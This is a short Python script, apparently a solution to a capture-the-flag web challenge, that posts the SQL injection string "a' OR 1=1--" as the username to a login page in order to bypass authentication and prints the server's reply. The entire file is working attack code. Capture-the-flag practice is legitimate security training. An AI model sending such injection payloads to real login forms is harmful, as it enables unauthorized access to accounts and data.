#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-03-19 20:53:06
# @Last Modified by:   john
# @Last Modified time: 2016-03-19 20:58:44

import requests

address = 'http://web.lasactf.com:63017/login.php'

response = requests.post(address,
                         data={"username": "a' OR 1=1--",
                               'password': 'anything'
                               }
                         )

print response.raw.read()
print response.text
